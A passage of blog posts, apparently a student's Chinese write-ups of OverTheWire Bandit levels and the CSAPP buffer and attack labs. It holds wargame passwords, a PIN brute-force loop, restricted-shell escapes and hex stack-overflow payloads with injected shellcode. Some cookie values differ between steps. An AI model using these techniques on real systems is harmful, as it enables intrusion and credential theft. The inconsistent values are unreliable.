[{"content":"参考博客：OverTheWire: Level Goal: Bandit Level 12 → Level 13\nlevel12-13 主要思路： 先将文件转化为二进制文件，再利用file命令查看文件类型，根据文件类型来解压缩\nlevel17-18 利用diff -a\nlevel18-19 The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.\nssh -p 2220 bandit18@bandit.labs.overthewire.org cat readme level19-20 setuid，利用bandit20.do文件来提权root\n./bandit20-do cat /etc/bandit_pass/bandit20 level20-21 利用nc -lv 监听端口，再用./suconnect 端口号连接\nlevel21-22 找到对应的crond脚本\nlevel22-23 找到对应脚本,再把bandit23的mytarget找出来，再读取密码\nbandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d \u0026#39; \u0026#39; -f 1) echo \u0026#34;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\u0026#34; cat /etc/bandit_pass/$myname \u0026gt; /tmp/$mytarget bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d \u0026#39; \u0026#39; -f 1 level23-24 找到对应脚本，参考上一个level的脚本，创建一个新的脚本来获取密码，注意文件的权限问题\n#!/bin/bash cat /etc/bandit_pass/bandit24 \u0026gt; /tmp/bandit24/bandit24 level24-25 Level Goal\nA daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. You do not need to create new connections each time\ntips： nc localhost 30002 利用shell脚本进行爆破\n注意程序可能会因为超时卡住，所以要分段爆破\nfor i in {0000..9999} do echo \u0026#34;VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i\u0026#34; \u0026gt;\u0026gt; ./banditpin done cat ./banditpin | nc localhost 30002 \u0026gt;\u0026gt; ./bandit25pass level25-26 Level Goal\nLogging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.\n参考博客：OverTheWire Bandit Level 25 -\u0026gt; 26 - Walkthrough - MayADevBe Blog\nls发现目录下有bandit26的私钥，尝试使用ssh -i 进行连接，连接失败，由于/bin/bash被修改。\n利用cat /etc/passwd查看bandit26所使用的shell，发现为/usr/bin/showtext，再查看这个文件，发现它是个脚本，并且通过more打开了text.txt文件，\nbandit25@bandit:~$ cat /etc/passwd | grep bandit26 bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit25@bandit:~$ ls -la /usr/bin/showtext -rwxr-xr-x 1 root root 53 May 7 2020 /usr/bin/showtext bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux more ~/text.txt exit 0 再次尝试ssh连接，失败\n$ ssh -i bandit26.sshkey bandit26@localhost ... _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| / / \u0026#39;_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to bandit.labs.overthewire.org closed. 分析原因，如果text.txt文件超过一页，那么more text.txt就会等待翻页，显然，text.txt文件太小，此时需要另辟蹊径，既然文件本身改变不了，那么反过来改变运行窗口的大小也能起到同样的作用。\n进入more以后，使用v进入vim编辑模式，再通过\u0026quot;:e /etc/bandit_pass_bandit26\u0026quot;得到password。（-e 打开文件）\n或者通过:set shell=/bin/bash :shell 来进入bandit26用户\nlevel26-27 Level Goal\nGood job getting a shell! Now hurry and grab the password for bandit27!\nbandit27.do已被setid，所以执行这个文件时会短暂使用root用户权限，借此我们可以执行其它命令。\nbandit26@bandit:~$ ls bandit27-do text.txt bandit26@bandit:~$ ./bandit27-do Run a command as another user. Example: ./bandit27-do id bandit26@bandit:~$ ./bandit27-do cat /etc/bandit\\_pass/bandit27 3ba3118a22e93127a4ed485be72ef5ea level27-28 Level Goal\nThere is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo via the port 2220. The password for the user bandit27-git is the same as for the user bandit27.\nClone the repository and find the password for the next level.\n在/tmp创建一个目录，接着在目录下git init，再git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo，注意端口号。最后读取README文件即成功\npassword：AVanL161y9rsbcJIsFHuw35rjaOM19nR\nlevel28-29 Level Goal\nThere is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo via the port 2220. The password for the user bandit28-git is the same as for the user bandit28.\nClone the repository and find the password for the next level.\ntips：\ngit log，show us the commit log git show show us the content of a commit (when creating a public repository it is important to be aware of the information you push to it since changes and previous version are saved. So sensitive data, like passwords, could still be retrieved). 克隆远程仓库后发现readme.md文件里没有显示password，无从下手，参考别人的博客发现这两个命令，于是迎刃而解。还是得积累更多的知识。\nlevel29-30 Level Goal There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo via the port 2220. The password for the user bandit29-git is the same as for the user bandit29.\nClone the repository and find the password for the next level.\n参照上个level的流程，发现\nbandit29@bandit:/tmp/bandit29/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: \u0026lt;no passwords in production!\u0026gt; production提示我们有其它的环境\n于是利用git branch -a查看是否有其它分支，发现dev环境\nbandit29@bandit:/tmp/bandit29/repo$ git branch -a * master remotes/origin/HEAD -\u0026gt; origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-dev 使用git checkout dev或git switch dev切换分支\nbandit29@bandit:/tmp/bandit29/repo$ git checkout remotes/origin/dev Note: switching to \u0026#39;remotes/origin/dev\u0026#39; 最后查看仓库，找到密码\nbandit29@bandit:/tmp/bandit29/repo$ ls code README.md bandit29@bandit:/tmp/bandit29/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS level30-31 Level Goal\nThere is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo via the port 2220. The password for the user bandit30-git is the same as for the user bandit30.\nClone the repository and find the password for the next level.\n与上面几个level的差异是这个level使用git tag来解决\nGit tagging is a way to mark specific points in the history of the repository. One example would be to mark release points of the software. The command to see the tags is git tag. To create a tag the command is git tag -a \u0026lt;tag_name\u0026gt; -m \u0026lt;\u0026quot;tag description/message\u0026quot;\u0026gt;. To see more details, like the tag message and commit, you can use the following command: git show \u0026lt;tag_name\u0026gt;.\nbandit30@bandit:/tmp/tmp.GLR635iQNn/repo$ git tag secret bandit30@bandit:/tmp/tmp.GLR635iQNn/repo$ git show secret OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt level31-32 Level Goal\nThere is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo via the port 2220. The password for the user bandit31-git is the same as for the user bandit31.\nClone the repository and find the password for the next level.\nTips\nGit Commit saves the currently made changes with a message describing these changes. The flag -a makes sure all modified/deleted files are staged.\nGit Push updates local changes in remote repositories. When pushing for the first time, you should also define the branch with -u.\nGit Ignore is a file with the filename ‘.gitignore’. In this file, all file names/extensions that should be ignored by the commit are written. This means if a file which is in the ignore file is created/changed, it will not be part of the commit/repository. Git ignore also allows for wildcards. (For example, : ‘*.pyc’ means all files with the ending ‘.pyc’ will be ignored.) There are pre-written files for specific situations and languages, like this one for Python.\nGit Add updates what files will be part of the next commit. The -f flag forces files to be able to be committed, even when they are normally ignored.\n.gitignore用来过滤本地仓库的一些文件或目录，使得在上传至远程仓库时忽略这些文件和目录，具体用法STFW\n解法：克隆远程仓库后查看readme.md文件，发现如下提示，按照提示创建key.txt文件，并把\u0026rsquo;May I come in?\u0026lsquo;写入，接着push到远程仓库，发现报错，于是修改.gitignore的文件内容使得其能正常push到远程仓库。\nbandit31@bandit:/tmp/bandit31/repo$ cat README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: \u0026#39;May I come in?\u0026#39; Branch: master bandit31@bandit:/tmp/bandit31/repo$ git add . bandit31@bandit:/tmp/bandit31/repo$ git commit -a -m\u0026#34;first\u0026#34; [master 50ed76a] first 2 files changed, 2 insertions(+), 1 deletion(-) create mode 100644 key.txt Enumerating objects: 6, done. Counting objects: 100% (6/6), done. Delta compression using up to 2 threads Compressing objects: 100% (2/2), done. Writing objects: 100% (4/4), 331 bytes | 331.00 KiB/s, done. Total 4 (delta 0), reused 0 (delta 0), pack-reused 0 remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost:2220/home/bandit31-git/repo level32-33 After all this git stuff its time for another escape. Good luck!\nTips\nLinux has Variables called local variables (valid in current shell), shell variables (set up by shell) and environment variables (valid systemwide). These variables have their names in uppercase only. They are defined by writing VAR_NAME=var_value in the command line. To see the content of a variable, you can write echo $VAR_NAME.\nTo print all environment variables, you can use printenv.\nSome common that are good to know are:\nTERM - current terminal emulation HOME - the path to home directory of currently logged in user LANG - current locales settings PATH - directory list to be searched when executing commands PWD - pathname of the current working directory SHELL/0 - the path of the current user’s shell USER - currently logged-in user 解法：因为shell把我们输入的字符全部转换为大写了，所以无法执行正常的指令，大写的字符一般与环境变量有关，$0表示所使用shell的名字，$$表示进程id，通过使用$0来进入正常shell，接着进入bandit33查看密码\n$ exit \u0026gt;\u0026gt; $0 $ whoami bandit33 $ ls uppershell $ cat /etc/bandit_pass/bandit33 odHo63fHiFqcWWJG9rLiLDtPm45KzUKy ","date":"2024-10-06T00:00:00Z","image":"https://chenyuan1125.github.io/en/p/bandit%E5%AE%9E%E9%AA%8C/1_hu5058548300299695135.jpg","permalink":"https://chenyuan1125.github.io/en/p/bandit%E5%AE%9E%E9%AA%8C/","title":"bandit实验"},{"content":"buffer实验 Level 0: Candle 目标：执行 smoke()，而不是让 getbuf() 返回 1。\nvoid test() { int val; /* Put canary on stack to detect possible corruption */ volatile int local = uniqueval(); val = getbuf(); /* Check for corrupted stack */ if (local != uniqueval()) { printf(\u0026#34;Sabotaged!: the stack has been corrupted\\n\u0026#34;); } else if (val == cookie) { printf(\u0026#34;Boom!: getbuf returned 0x%x\\n\u0026#34;, val); validate(3); } else { printf(\u0026#34;Dud: getbuf returned 0x%x\\n\u0026#34;, val); } } 在bufboms.s的第 363 行找到了 smoke 的地址 08048c18：\n再研究 test 的部分汇编代码：\n08048daa \u0026lt;test\u0026gt;: 8048daa:\t55 push %ebp 8048dab:\t89 e5 mov %esp,%ebp 8048dad:\t53 push %ebx 8048dae:\t83 ec 24 sub $0x24,%esp 8048db1:\te8 da ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; 8048db6:\t89 45 f4 mov %eax,-0xc(%ebp) 8048db9:\te8 36 04 00 00 call 80491f4 \u0026lt;getbuf\u0026gt; 8048dbe:\t89 c3 mov %eax,%ebx 8048dc0:\te8 cb ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; getbuff:\n080491f4 \u0026lt;getbuf\u0026gt;: 80491f4:\t55 push %ebp 80491f5:\t89 e5 mov %esp,%ebp 80491f7:\t83 ec 38 sub $0x38,%esp 80491fa:\t8d 45 d8 lea -0x28(%ebp),%eax 80491fd:\t89 04 24 mov %eax,(%esp) 8049200:\te8 f5 fa ff ff call 8048cfa \u0026lt;Gets\u0026gt; 8049205:\tb8 01 00 00 00 mov $0x1,%eax 804920a:\tc9 leave 804920b:\tc3 ret 可以看到 lea 把 buf 的指针地址 (-0x28 (% ebp)) 传给了 Gets ()，0x28 也就是十进制的 40 个字节。而 ebp 占了 4 个字节，buf 距离 getbuff 的返回地址还有 44 个字节。\n返回地址 需要修改的地址 ebp - 占用4字节 \u0026hellip; \u0026hellip; ebp - 40 字节 buf 数组的初始地址 \u0026hellip; \u0026hellip; ebp - 0x38 esp，栈帧首地址 从文档中得知：\nGets 函数不验证是否超出了 NORMAL_BUFFER_SIZE，所以超出字符的就会覆盖掉内存。\n那么只要在 buf 开始处随便填入 44 字节（0a 除外，会终止输入），然后在后面加入 smoke 的地址，覆盖掉栈中的返回地址即可。\n另外需要注意的是 x86 机器为小端法机器，最低有效字节在内存的前面，所以在 exploit.txt 中填入如下答案即可：\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08 level 1：Sparker 目标：调用fizz函数，并且通过传递自己的cookie值作为参数，以此来通过验证\n08048c42 \u0026lt;fizz\u0026gt;: 8048c42:\t55 push %ebp 8048c43:\t89 e5 mov %esp,%ebp 8048c45:\t83 ec 18 sub $0x18,%esp 8048c48:\t8b 45 08 mov 0x8(%ebp),%eax 8048c4b:\t3b 05 08 d1 04 08 cmp 0x804d108,%eax 8048c51:\t75 26 jne 8048c79 \u0026lt;fizz+0x37\u0026gt; 8048c53:\t89 44 24 08 mov %eax,0x8(%esp) 8048c57:\tc7 44 24 04 ee a4 04 movl $0x804a4ee,0x4(%esp) 8048c5e:\t08 8048c5f:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c66:\te8 55 fd ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048c6b:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c72:\te8 04 07 00 00 call 804937b \u0026lt;validate\u0026gt; 8048c77:\teb 18 jmp 8048c91 \u0026lt;fizz+0x4f\u0026gt; 8048c79:\t89 44 24 08 mov %eax,0x8(%esp) 8048c7d:\tc7 44 24 04 40 a3 04 movl $0x804a340,0x4(%esp) 8048c84:\t08 8048c85:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c8c:\te8 2f fd ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048c91:\tc7 04 24 00 00 00 00 movl $0x0,(%esp) 8048c98:\te8 63 fc ff ff call 8048900 \u0026lt;exit@plt\u0026gt; 栈结构示意图：\n地址 解释 ebp + 8 字节 val 返回地址 应当为 fizz 的首地址 ebp 占4字节 \u0026hellip; \u0026hellip; ebp-40字节 buf数组的初始地址 同样是在buf中插入cookie值，注意函数参数在函数返回地址之前，所以，cookie值应该插入在ebp+8起始的八个字节中，所以在 exploit.txt 中填入如下答案即可：\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 86 07 ce 2b level2：Firecracker 目标：调用bang函数，并且修改global_value为自己的cookie值\n08048c9d \u0026lt;bang\u0026gt;: 8048c9d:\t55 push %ebp 8048c9e:\t89 e5 mov %esp,%ebp 8048ca0:\t83 ec 18 sub $0x18,%esp 8048ca3:\ta1 00 d1 04 08 mov 0x804d100,%eax 8048ca8:\t3b 05 08 d1 04 08 cmp 0x804d108,%eax 8048cae:\t75 26 jne 8048cd6 \u0026lt;bang+0x39\u0026gt; 8048cb0:\t89 44 24 08 mov %eax,0x8(%esp) 8048cb4:\tc7 44 24 04 60 a3 04 movl $0x804a360,0x4(%esp) 8048cbb:\t08 8048cbc:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048cc3:\te8 f8 fc ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048cc8:\tc7 04 24 02 00 00 00 movl $0x2,(%esp) 8048ccf:\te8 a7 06 00 00 call 804937b \u0026lt;validate\u0026gt; 8048cd4:\teb 18 jmp 8048cee \u0026lt;bang+0x51\u0026gt; 8048cd6:\t89 44 24 08 mov %eax,0x8(%esp) 8048cda:\tc7 44 24 04 0c a5 04 movl $0x804a50c,0x4(%esp) 8048ce1:\t08 8048ce2:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048ce9:\te8 d2 fc ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048cee:\tc7 04 24 00 00 00 00 movl $0x0,(%esp) 8048cf5:\te8 06 fc ff ff call 8048900 \u0026lt;exit@plt\u0026gt; 已知变量的内存地址，我们可以通过插入恶意代码来修改变量的值，汇编代码如下：\n# 改变 global_value movl $0x2bce0786,0x804d100 # 将 bang 函数的首地址压入栈 pushl $0x08048c9d ret 接下来就是将汇编语言转换成十六进制的机器代码了。使用gcc -m32 -c 和 objdump -d可以得到转换之后的文件：\n00000000 \u0026lt;.text\u0026gt;: 0:\tc7 05 00 d1 04 08 86 movl $0x2bce0786,0x804d100 7:\t07 ce 2b a:\t68 9d 8c 04 08 push $0x8048c9d f:\tc3 ret 那么所有的字节就是 c7 05 00 d1 04 08 70 5a 2d 36 68 9d 8c 04 08 c3。接下来回到 getbuff 的汇编代码：\n080491f4 \u0026lt;getbuf\u0026gt;: 80491f4:\t55 push %ebp 80491f5:\t89 e5 mov %esp,%ebp 80491f7:\t83 ec 38 sub $0x38,%esp 80491fa:\t8d 45 d8 lea -0x28(%ebp),%eax 80491fd:\t89 04 24 mov %eax,(%esp) 8049200:\te8 f5 fa ff ff call 8048cfa \u0026lt;Gets\u0026gt; 8049205:\tb8 01 00 00 00 mov $0x1,%eax 804920a:\tc9 leave 804920b:\tc3 ret 构造栈的结构：\n地址 解释 0x55683e78 入侵代码的起始地址，也就是调用get函数前eax寄存器的值 ebp \u0026hellip; ret push $0x08048c9d 0x08048c9d为bang函数的起始地址 movl $0x2bce0786,0x804d100 0x804d100为global_value变量的内存地址，0x2bce0786为hack对应的cookie值,当前地址为buf数组的初始地址 rsp-40字节 结合以上信息，构造下列答案：\nc7 05 00 d1 04 08 86 07 ce 2b 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 3e 68 55 运行结果如下：\nlevel3： Dynamite 目标：注入一段能够修改 getbuf 返回值的代码，返回值从 1 改成 cookie 值，此外还需要还原所有破坏，继续运行 test 的剩下部分，注意getbuf函数开头的push %ebp。\n同样回到 getbuff 的汇编代码：\n080491f4 \u0026lt;getbuf\u0026gt;: 80491f4:\t55 push %ebp 80491f5:\t89 e5 mov %esp,%ebp 80491f7:\t83 ec 38 sub $0x38,%esp 80491fa:\t8d 45 d8 lea -0x28(%ebp),%eax 80491fd:\t89 04 24 mov %eax,(%esp) 8049200:\te8 f5 fa ff ff call 8048cfa \u0026lt;Gets\u0026gt; 8049205:\tb8 01 00 00 00 mov $0x1,%eax 804920a:\tc9 leave 804920b:\tc3 ret 注意到调用Gets函数后，会将eax寄存器置1，于是我们需要跳过这条命令，再修改eax寄存器的值，最后返回到调用getbuf函数的下一条命令，不能回到getbuf函数的leave命令，因为返回test函数的地址已经没了，如果返回到getbuf函数的leave命令，那么还需在ret后面添加test函数的返回地址。\n结合 test 的前几行代码：\n08048daa \u0026lt;test\u0026gt;: 8048daa:\t55 push %ebp 8048dab:\t89 e5 mov %esp,%ebp 8048dad:\t53 push %ebx 8048dae:\t83 ec 24 sub $0x24,%esp 8048db1:\te8 da ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; 8048db6:\t89 45 f4 mov %eax,-0xc(%ebp) 8048db9:\te8 36 04 00 00 call 80491f4 \u0026lt;getbuf\u0026gt; 8048dbe:\t89 c3 mov %eax,%ebx 8048dc0:\te8 cb ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; 所以应当构造 Gets 的栈帧如下：\n地址 解释 返回地址 设置成缓冲区的首地址 ebp 占用4字节 \u0026hellip; \u0026hellip; ebp - 40 字节 buf 数组的初始地址，从这里开始注入修改 eax 的代码 \u0026hellip; \u0026hellip; ebp - 0x38 esp，栈帧首地址 构造的汇编命令如下：\n00000000 \u0026lt;.text\u0026gt;: 0:\tb8 86 07 ce 2b mov $0x2bce0786,%eax 5:\t68 0a 92 04 08 push $0x804920a a:\tc3 ret 为了防止对栈的破坏，ebp 是被调用者保存寄存器，是 test 在调用 getbuf 之后，getbuf 首先就就压进了栈帧里。同时为了使程序继续运行，需要保证 ebp 不被破坏。使用 gdb，在 getbuf 的第一行 0x080491f4 处打下断点，研究此时ebp 的值，ebp的值为0x55683ed0。\n所以构造的答案为：\nb8 86 07 ce 2b 68 be 8d 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0 3e 68 55 78 3e 68 55 最后的运行结果为：\nlevel4：Nitroglycerin（这个实验的解题思路有点没有理解） 目标：使用-n参数进入该实验，该实验会连续调用5次getbufn，要求我们每次在调用getbufn函数后返回cookie值，而不是1，同时还需恢复所有破坏。\n和前面不同的是，这一个阶段由于使用的是 getbufn 和 testn 函数，并且需要将一个相同的字符串输入五次。所以需要使用命令-n\n同时，文档也指出在 getbufn 中有#define KABOOM_BUFFER_SIZE 512，所以缓冲区大小为 512.\n这次研究 getbufn 的汇编代码：\n(gdb) disas Dump of assembler code for function getbufn: 0x0804920c \u0026lt;+0\u0026gt;:\tpush %ebp 0x0804920d \u0026lt;+1\u0026gt;:\tmov %esp,%ebp # esp 减去了 536 个字节 0x0804920f \u0026lt;+3\u0026gt;:\tsub $0x218,%esp # buf 的首地址空间离 ebp 有 520 个字节 =\u0026gt; 0x08049215 \u0026lt;+9\u0026gt;:\tlea -0x208(%ebp),%eax 0x0804921b \u0026lt;+15\u0026gt;:\tmov %eax,(%esp) 0x0804921e \u0026lt;+18\u0026gt;:\tcall 0x8048cfa \u0026lt;Gets\u0026gt; 0x08049223 \u0026lt;+23\u0026gt;:\tmov $0x1,%eax 0x08049228 \u0026lt;+28\u0026gt;:\tleave 0x08049229 \u0026lt;+29\u0026gt;:\tret End of assembler dump. 在这一阶段，getbufn 会调用 5 次，每次的储存的 ebp 都不一样，官方文档表示这个差值会在 +- 240 的样子：\n接下来使用 gdb，在 getbufn 打下断点，连续 5 次查看 % ebp 的值，可以得到这五次 ebp 的值分别是在：\nNo p/x $ebp p/x $ebp - 0x208 1 0x55683110 0x55682f08 2 0x556830b0 0x55682ea8 3 0x55683100 0x55682ef8 4 0x55683110 0x55682f08 5 0x55683180 0x55682f78 对应的，buf 的起始地址就是每一次记的 ebp 减去 208，也就是 520 字节。\n所以每一次的地址是无法确认的。英文文档中介绍了可以使用 nop sled 的方法来解决这一问题。参考 CSAPP 教材中的介绍：\n因为在这个实验中，栈的地址是变化的。我们不知道有效机器代码的入口地址了，因此我们需要在有效机器代码前填充大量的nop指令，只要程序可以跳转到这些nop指令中，那么最终就可以滑到有效的机器代码。\n运行getbufn函数时，会随机在栈上分配一块存储地址，因此，getbufn的基址ebp时随机变化的。但是又要求我们写的跳转地址是固定的，所以我们应该在有效代码之前大量填充nop指令，让这段地址内的代码都会滑到这段nop之后的代码上。\n由于栈上的机器代码是按地址由低向高顺序执行，要保证五次运行都能顺利执行有效机器代码，需要满足：跳转地址位于有效机器代码入口地址之前的nop机器指令填充区。这要求尽可能增大nop填充区，尽可能使有效机器代码段往后挪。\n从反汇编可以看出，buf的首地址为ebp-0x208，所以buf总共的大小为520字节。考虑这个函数中，testn的ebp随每次输入都随机变化，但是栈顶esp的位置却不变，所以我们可以通过esp和ebp的关系来找出这个关系，从而进行攻击\n首先在sub $0x218，esp这一句设置断点，并使用-n模式运行程序，并查看ebp的值。\n我们要做的是找出最大的ebp值0x556835e0，再减去0x208，即为最高的buf的始地址为：0x556833D8。\n如果将有效机器代码置于跳转地址之前，并将其它所有字符都用作nop指令，此时所有五个buf地址的写入都能满足跳转到地址0x556833D8后顺利到达有效机器代码\n接下来需要处理的问题是注入并覆盖 ebp 后，把正确的 esp 还原回去。研究 testn 的部分汇编代码：\nDump of assembler code for function testn: 0x08048e26 \u0026lt;+0\u0026gt;:\tpush %ebp 0x08048e27 \u0026lt;+1\u0026gt;:\tmov %esp,%ebp 0x08048e29 \u0026lt;+3\u0026gt;:\tpush %ebx 0x08048e2a \u0026lt;+4\u0026gt;:\tsub $0x24,%esp 0x08048e2d \u0026lt;+7\u0026gt;:\tcall 0x8048d90 \u0026lt;uniqueval\u0026gt; 0x08048e32 \u0026lt;+12\u0026gt;:\tmov %eax,-0xc(%ebp) 0x08048e35 \u0026lt;+15\u0026gt;:\tcall 0x804920c \u0026lt;getbufn\u0026gt; 0x08048e3a \u0026lt;+20\u0026gt;:\tmov %eax,%ebx 0x08048e3c \u0026lt;+22\u0026gt;:\tcall 0x8048d90 \u0026lt;uniqueval\u0026gt; 在每一次调用了 getbufn 之后，ebp 的值将会被 push 进去。这个 ebp 值是等于 testn 被调用的时候 esp 存储的值的。esp 先由于 push ebx 而减去了 4，再手动减去了 0x24，所以这个时候 exp + 0x28 的值就是传入了 getbufn 开始的时候 ebp 的值。\n所以构造出来的汇编代码如下：\nlea 0x28(%esp), %ebp mov $0x362d5a70, %eax push $0x08048e3a ret 地址 解释 返回地址 设置成缓冲区的首地址 ebp 占用4字节 \u0026hellip; \u0026hellip; ebp - 520字节 buf 数组的初始地址，从这里开始注入修改 eax 的代码 \u0026hellip; \u0026hellip; ebp - 0x218 esp，栈帧首地址 ","date":"2024-10-06T00:00:00Z","image":"https://chenyuan1125.github.io/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/1_hu5285632878379324052.jpg","permalink":"https://chenyuan1125.github.io/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/","title":"CSAPP:buffer实验"},{"content":"Attack lab 该实验在我电脑的wsl的ubuntu操作系统下无法正常运行，在debian环境下能正常运行，注意运行时要加上-q\nPart I:Code Injection Attacks Level 1 通过输入字符串，利用栈溢出原理，将getbuf函数的返回地址改成touch1函数的入口地址\n注意字节顺序\ngetbuf函数的反汇编代码\n00000000004017a8 \u0026lt;getbuf\u0026gt;: 4017a8:\t48 83 ec 28 sub $0x28,%rsp 4017ac:\t48 89 e7 mov %rsp,%rdi 4017af:\te8 8c 02 00 00 call 401a40 \u0026lt;Gets\u0026gt; 4017b4:\tb8 01 00 00 00 mov $0x1,%eax 4017b9:\t48 83 c4 28 add $0x28,%rsp 4017bd:\tc3 ret 4017be:\t90 nop 4017bf:\t90 nop phase_1.txt文件\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 运行命令\n./hex2raw \u0026lt; phase_1.txt |./ctarget -q Level 2 level2需要将vlevel的值改成cookie值，再return到touch2函数入口处。\n修改后的rsp寄存器如下所示：\nphase_2.txt文件\n48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 运行命令\n./hex2raw \u0026lt; phase_1.txt |./ctarget -q 结果\nCookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 Level3 本题与上题类似，不同点在于传的参数是一个字符串。先给出touch3的C语言代码\nvoid touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\u0026#34;Touch3!: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); validate(3); } else { printf(\u0026#34;Misfire: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); fail(3); } exit(0); } touch3中调用了hexmatch，它的C语言代码为：\n/* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \u0026#34;%.8x\u0026#34;, val); return strncmp(sval, s, 9) == 0; } 也就是说，要把cookie转换成对应的字符串传进去\n注意第6行，s的位置是随机的，我们写在getbuf栈中的字符串很有可能被覆盖，一旦被覆盖就无法正常比较。\n因此，考虑把cookie的字符串数据存在test的栈上，其它部分与上题相同，这里不再重复思路。\n注入代码 先查找test栈顶指针的位置：\n0x5561dca8，这就是字符串存放的位置，也是调用touch3应该传入的参数，又touch3代码的地址为4018fa。从而得到代码：\nmovq $0x5561dca8, %rdi pushq $0x4018fa ret 字节级表示为：\nDisassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 fa 18 40 00 pushq $0x4018fa c: c3 retq 栈帧讲解 我们期望的栈帧为\n逻辑如下：\ngetbuf执行ret，从栈中弹出返回地址，跳转到我们注入的代码 代码执行，先将存在caller的栈中的字符串传给参数寄存器%rdi，再将touch3的地址压入栈中 代码执行ret，从栈中弹出touch3指令，成功跳转 Solution cookie0x59b997fa作为字符串转换为ASCII为：35 39 62 39 39 37 66 61\n注入代码段的地址与上题一样，同样为0x5561dc78\n由于在test栈帧中多利用了一个字节存放cookie，所以本题要输入56个字节。注入代码的字节表示放在开头，33-40个字节放置注入代码的地址用来覆盖返回地址，最后八个字节存放cookie的ASCII 。于是得到如下输入：\n48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 攻击成功！\nPart II:Return-Oriented Programing 